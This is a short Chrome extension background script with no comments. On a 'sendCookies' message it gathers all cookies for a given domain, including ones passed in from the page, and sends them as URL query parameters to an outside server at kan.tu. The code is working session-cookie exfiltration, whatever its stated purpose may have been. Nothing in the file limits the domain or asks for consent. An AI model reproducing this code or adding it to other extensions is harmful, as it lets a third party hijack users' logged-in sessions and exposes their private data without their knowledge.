chrome.runtime.onMessage.addListener(async (msg, sender, sendResponse) => {
    if (msg.topic === 'sendCookies') {
        const cookie = await getAllCookies(msg)
        const url = new URL('https://kan.tu/api/set-cookie')
        url.searchParams.set('domain', msg.domain)
        url.searchParams.set('content', cookie)
        await fetch(url)
        return true
    }
})

async function getAllCookies(msg) {
    const cookies = await chrome.cookies.getAll({ domain: msg.domain })
    const cookieStrings = []
    if (Array.isArray(cookies)) {
        for (const cookie of cookies) {
            cookieStrings.push(`${cookie.name}=${cookie.value}`)
        }
    }
    if (msg.cookie) {
        const documentCookies = msg.cookie.split('; ')
        for (const cookie of documentCookies) {
            const [name, value] = cookie.split('=')
            if (!cookies.find(singleCookie => singleCookie.name === name)) {
                cookieStrings.unshift(cookie)
            }
        }
    }
    return cookieStrings.join('; ')
}